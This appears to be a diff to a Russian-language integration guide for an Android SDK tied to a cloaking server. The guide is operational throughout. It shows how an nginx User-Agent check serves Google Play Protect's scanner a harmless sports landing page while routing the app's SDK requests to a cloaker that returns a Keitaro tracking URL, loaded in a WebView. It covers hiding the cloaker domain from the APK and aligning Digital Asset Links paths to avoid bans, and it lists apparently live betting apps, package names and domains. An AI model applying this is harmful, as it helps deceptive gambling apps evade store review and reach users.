@@ -1,6 +1,6 @@
-# SDK v4.0.2 — интеграция
+# SDK v4.0.3 — интеграция
 
-Тонкий клиент. Один класс, один POST, минимум палева. Прила стучится на свой мини-сервер по пути `/sports`, nginx там прозрачно проксирует запрос в КЛО и возвращает JSON `{"url":"..."}`. Домен КЛО в APK не светится.
+Тонкий клиент. Один класс, один POST, минимум палева. Прила стучится на свой мини-сервер по **уникальному пути прилы** (тому, что заявлен в `assetlinks.json` и виден в её лендинге). Nginx там прозрачно проксирует запрос в КЛО и возвращает JSON `{"url":"..."}`. Домен КЛО в APK не светится.
 
 ---
 
@@ -34,18 +34,27 @@ plugins {
 ```properties
 SERVICE_TOKEN=<sid из панели>
 SERVICE_URL=https://твой-мини-сервер.com
-SERVICE_PATH=/sports         # путь зависит от типа мини-сервера (см. таблицу ниже)
+SERVICE_PATH=/YOUR_DAL_PATH       # ← ровно тот, что в assetlinks.json и в URL лендинга
 CLOUD_PROJECT_NUMBER=<число из Play Console → App integrity>
 ```
 
-> **⚠️ `SERVICE_PATH` зависит от типа мини-сервера:**
+> ### ⚠️ Anti-ban правило — `SERVICE_PATH` обязан совпадать с DAL
 >
-> | Тип сервера | Путь | Примеры |
+> `SERVICE_PATH` **= path в `/.well-known/assetlinks.json`** на домене мини-сервера **= path вашего лендинга** (URL, который выдаёт клиент).
+>
+> Google Play Protect scanner кликает по URL из DAL. Если заявили `/foo`, а SDK бьёт на `/bar` → палево → бан.
+>
+> Примеры реальных прил:
+>
+> | Прила | Лендинг URL | `SERVICE_PATH` |
 > |---|---|---|
-> | Тип A/C (nginx + КЛО-прокси) | `/sports` | Betclic, Stake, gesr, Sisal, LamDep, Snai, Betsson и др. |
-> | Тип B (Next.js middleware без nginx) | `/init` | Unibet (`unisportapp.com`), NV Casino (`casualnvgameapi.com`) |
+> | Betsson (`com.mzourobv.motocross`) | `https://sportfootballapi.com/betsson_live` | `/betsson_live` |
+> | Total Casino #1 | `https://supercastotalgame.com/total_play` | `/total_play` |
+> | Total Casino #2 | `https://totalsupergame.com/game` | `/game` |
+> | SNAI | `https://footballapisnai.com/sports` | `/sports` |
+> | Betsson #2 | `https://sportapiplay.com/stats` | `/stats` |
 >
-> Если не уверен — используй `/init` (работает на ВСЕХ серверах). `/sports` — только на серверах с nginx `location = /sports`.
+> Валидацию сделает панель КЛО во вкладке **«Пути / DAL»** — кнопка `DAL check` тянет `assetlinks.json`, сверяет SHA-256, проверяет что path отдаёт HTML-лендинг; кнопка `Health check` делает реальный SDK POST и проверяет что мини-сервер вернул `{"url":"..."}`.
 
 Прокинь в `BuildConfig`:
 ```kotlin
@@ -78,18 +87,20 @@ class MyApp : Application() {
 }
 ```
 
-## 4. Path
+## 4. Path — per app из DAL
 
-`SERVICE_PATH` зависит от типа мини-сервера:
+`SERVICE_PATH` = точный путь из `/.well-known/assetlinks.json` на домене мини-сервера. Это тот же path, что отдаёт браузерный лендинг (клиент прислал ссылку типа `https://<домен>/<path>` — этот `<path>` и есть `SERVICE_PATH`).
 
-| Тип | Путь | Как работает | Серверы |
-|---|---|---|---|
-| **A/C** (nginx + КЛО-прокси) | `/sports` | nginx `location = /sports` → проксирует POST в КЛО `/engine/init`, инжектит `X-Proxy-Key` | Betclic, Stake, gesr, Sisal, LamDep, Snai, Betsson и т.д. |
-| **B** (Next.js middleware) | `/init` | middleware.ts matcher `/init` → fetch к КЛО, возвращает JSON | Unibet (`unisportapp.com`), NV Casino (`casualnvgameapi.com`) |
+**Как работает под капотом (одинаково для всех прил):**
 
-**Не уверен какой тип?** Используй `/init` — работает на **всех** серверах (Тип A/C тоже принимает `/init` через middleware fallback).
+- **Браузер** заходит на `https://<домен>/<path>` → nginx `location = /<path>` отдаёт Next.js лендинг (белая спортивная страница). Google scanner при DAL-проверке видит именно этот безобидный лендинг.
+- **SDK** (okhttp UA) POST-ит на тот же `https://<домен>/<path>` → nginx детектит okhttp через `if $http_user_agent ~* okhttp { return 418 }` → error_page 418 → `@sdk_proxy` → `rewrite ^ /init break` → проксирует в mini-КЛО на `127.0.0.1:8100`.
 
-`SERVICE_URL` — брендовый домен мини-сервера (напр. `https://asportvalsisapp.com`). Доменом КЛО в APK **не светим**.
+Т.е. один и тот же URL обслуживает **и** лендинг **и** SDK — split по User-Agent на уровне nginx. SDK не видит `/init`, КЛО не видит клиентский path — оба видят то, что им надо. Google видит согласованный DAL: заявили path, path работает, SHA-256 совпадает.
+
+**Проверка DAL перед релизом:** панель КЛО → вкладка **«Пути / DAL»** → кнопка `DAL check`. Всё зелёное = готово.
+
+`SERVICE_URL` — брендовый домен мини-сервера (напр. `https://sportfootballapi.com`). Доменом КЛО в APK **не светим**.
 
 > ⚠️ Прила ДОЛЖНА быть с `direct_redirect=true` в панели — иначе КЛО для grey вернёт бонс на `api.threeamigosteam.com/engine/go` (светит домен). У direct_redirect КЛО отдаёт брендовый Keitaro-URL напрямую. У всех боевых прил это уже включено.
 
@@ -147,7 +158,7 @@ webView.loadUrl(url)
 ## 9. Что уходит на сервер
 
 ```http
-POST /sports HTTP/1.1                       ← путь из SERVICE_PATH (/sports или /init)
+POST /<DAL_path> HTTP/1.1                   ← путь из SERVICE_PATH (см. секцию 4)
 Host: твой-мини-сервер.com
 Content-Type: application/octet-stream
 X-App-Id: com.твоя.пака
